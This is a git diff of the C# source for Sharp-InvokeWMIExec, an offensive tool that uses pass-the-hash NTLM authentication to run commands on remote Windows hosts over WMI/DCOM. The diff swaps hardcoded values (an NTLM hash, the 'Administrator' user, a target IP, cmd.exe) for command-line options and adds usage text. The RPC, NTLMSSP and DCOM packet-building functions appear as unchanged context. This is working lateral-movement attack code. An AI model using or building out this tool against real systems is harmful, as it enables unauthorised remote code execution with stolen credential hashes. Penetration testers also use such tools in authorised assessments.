@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Net;
-using System.Windows;
 using Mono.Options;
 using System.Threading;
 using System.Security.Cryptography;
@@ -10,7 +9,6 @@ using System.Collections.Specialized;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Collections;
 
 namespace Sharp_InvokeWMIExec
@@ -20,26 +18,25 @@ namespace Sharp_InvokeWMIExec
         static void Main(string[] args)
         {
             //User Params
-            string command = "cmd.exe";
-            string hash = "aad3b435b51404eeaad3b435b51404ee:a1be643b5b14ec8a12135d86b5c78616";
-            string username = "Administrator";
+            string command = "";
+            string hash = "";
+            string username = "";
             string output_username = "";
             bool debugging = false;
             string domain = "";
-            string target = "192.168.1.172";
-            //string target= "127.0.0.1";
+            string target = "";
             string processID = "";
             string target_short = "";
             int sleep = 5;
+			bool show_help = false;
 
-            //Tracking Params
-            int request_length = 0;
+			//Tracking Params
+			int request_length = 0;
             bool  WMI_execute = false;
             int sequence_number_counter = 0;
             int request_split_index_tracker = 0;
             byte[] WMI_client_send;
             string WMI_random_port_string = null;
-            byte[] WMI_random_port = null;
             string target_long = "";
             int WMI_random_port_int = 0;
             IPAddress target_type = null;
@@ -67,12 +64,32 @@ namespace Sharp_InvokeWMIExec
             byte[] WMI_namespace_unicode = null;
             byte[] IPID2 = null;
             int request_split_stage = 0;
-            if (!string.IsNullOrEmpty(command))
+
+
+			OptionSet options = new OptionSet()
+			.Add("?:|help:", "Prints out the options.", h => show_help = true)
+			.Add("t=|target=", "Hostname or IP address of the target.", t => target = t)
+			.Add("u=|username=", "Username to use for authentication.", u => username = u)
+			.Add("d=|domain=", "Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the username.", d => domain = d)
+			.Add("h=|hash=", "NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.", h => hash = h)
+			.Add("c=|command=", "Command to execute on the target. If a command is not specified, the function will check to see if the username and hash provides local admin access on the target.", option => command = option)
+			.Add("sleep=", "Time in seconds to sleep. Change this value if you're getting weird results.", option => sleep = int.Parse(option))
+			.Add("debug:", "Switch, enable debugging", option => debugging = true);
+			options.Parse(args);
+
+
+			if (show_help)
+			{
+				displayHelp();
+				return;
+			}
+
+			if (!string.IsNullOrEmpty(command))
             {
                 WMI_execute = true;
             }
 
-            if (!string.IsNullOrEmpty(hash))
+            if (!string.IsNullOrEmpty(hash) && !string.IsNullOrEmpty(username))
             {
                 if (debugging == true) { Console.WriteLine("Checking Hash Value \nCurrent Hash: {0}", hash); }
                 if (hash.Contains(":"))
@@ -80,6 +97,21 @@ namespace Sharp_InvokeWMIExec
                     hash = hash.Split(':').Last();
                 }
             }
+            else
+            {
+                if (string.IsNullOrEmpty(hash))
+                {
+                    Console.WriteLine("Missing required Option: hash");
+                }
+                else
+                {
+                    Console.WriteLine("Missing required Option: username");
+                }
+                displayHelp();
+                Console.ReadKey();
+                return;
+            }
+
 
             //Check to see if domain is empty, if it's not update the username, if it is just keep the username
             if (!string.IsNullOrEmpty(domain))
@@ -93,6 +125,7 @@ namespace Sharp_InvokeWMIExec
             if(target == "localhost")
             {
                 target = "127.0.0.1";
+                target_long = "127.0.0.1";
             }
             try
             {
@@ -945,10 +978,11 @@ namespace Sharp_InvokeWMIExec
                 Console.ReadLine();
             }
         }
-
+        
+        //Begin Helper Functions.
         public static void displayHelp()
         {
-            Console.WriteLine("HELP!");
+            Console.WriteLine("Usage: Sharp-InvokeWMIExec.exe -h=\"hash\" -u=\"test\\username\" -t=\"target\" -c=\"command\" ");
         }
         public static byte[] getByteRange(byte[] array, int start, int end)
         {
@@ -982,7 +1016,6 @@ namespace Sharp_InvokeWMIExec
 
             return byte_Array;
         }
-
         private static OrderedDictionary GetPacketRPCBind(int packet_call_ID, byte[] packet_max_frag, byte[] packet_num_ctx_items, byte[] packet_context_ID, byte[] packet_UUID, byte[] packet_UUID_version)
         {
 
@@ -1071,7 +1104,6 @@ namespace Sharp_InvokeWMIExec
 
             return packet_RPCBind;
         }
-
         private static OrderedDictionary GetPacketRPCAuth3(byte[] packet_NTLMSSP)
         {
             //4 extra bytes?
@@ -1102,7 +1134,6 @@ namespace Sharp_InvokeWMIExec
 
             return packet_RPCAuth3;
         }
-
         private static OrderedDictionary GetPacketRPCRequest(byte[] packet_flags, int packet_service_length, int packet_auth_length, int packet_auth_padding, byte[] packet_call_ID, byte[] packet_context_ID, byte[] packet_opnum, byte[] packet_data)
         {
             int packet_full_auth_length;
@@ -1156,7 +1187,6 @@ namespace Sharp_InvokeWMIExec
             return packet_RPCRequest;
 
         }
-
         private static OrderedDictionary GetPacketRPCAlterContext(byte[] packet_assoc_group, byte[] packet_call_ID, byte[] packet_context_ID, byte[] packet_interface_UUID)
         {
             OrderedDictionary packet_RPCAlterContext = new OrderedDictionary();
@@ -1186,7 +1216,6 @@ namespace Sharp_InvokeWMIExec
 
             return packet_RPCAlterContext;
         }
-
         private static OrderedDictionary GetPacketNTLMSSPVerifier(int packet_auth_padding, byte[] packet_auth_level, byte[] packet_sequence_number)
         {
             OrderedDictionary packet_NTLMSSPVerifier = new OrderedDictionary();
@@ -1223,7 +1252,6 @@ namespace Sharp_InvokeWMIExec
 
             return packet_NTLMSSPVerifier;
         }
-
         private static OrderedDictionary GetPacketDCOMRemQueryInterface(byte[] packet_causality_ID,byte[] packet_IPID, byte[] packet_IID)
         {
             OrderedDictionary packet_DCOMRemQueryInterface = new OrderedDictionary();
@@ -1242,7 +1270,6 @@ namespace Sharp_InvokeWMIExec
 
             return packet_DCOMRemQueryInterface;
         }
-
         private static OrderedDictionary GetPacketDCOMRemRelease(byte[] packet_causality_ID, byte[] packet_IPID, byte[] packet_IPID2)
         {
             OrderedDictionary packet_DCOMRemRelease = new OrderedDictionary();
@@ -1262,7 +1289,7 @@ namespace Sharp_InvokeWMIExec
             packet_DCOMRemRelease.Add("packet_DCOMRemRelease_PrivateRefs2", new byte[] { 0x00,0x00,0x00,0x00});
             return packet_DCOMRemRelease;
         }
-            private static OrderedDictionary GetPacketDCOMRemoteCreateInstance(byte[] packet_causality_ID, string packet_target)
+        private static OrderedDictionary GetPacketDCOMRemoteCreateInstance(byte[] packet_causality_ID, string packet_target)
         {
 
             byte[] packet_target_unicode = Encoding.Unicode.GetBytes(packet_target);
@@ -1397,7 +1424,6 @@ namespace Sharp_InvokeWMIExec
             packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoUnusedBuffer", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
             return packet_DCOMRemoteCreateInstance;
         }
-
         private static ushort DataLength2(int length_start, byte[] string_extract_data)
         {
             byte[] bytes = { string_extract_data[length_start], string_extract_data[length_start + 1] };
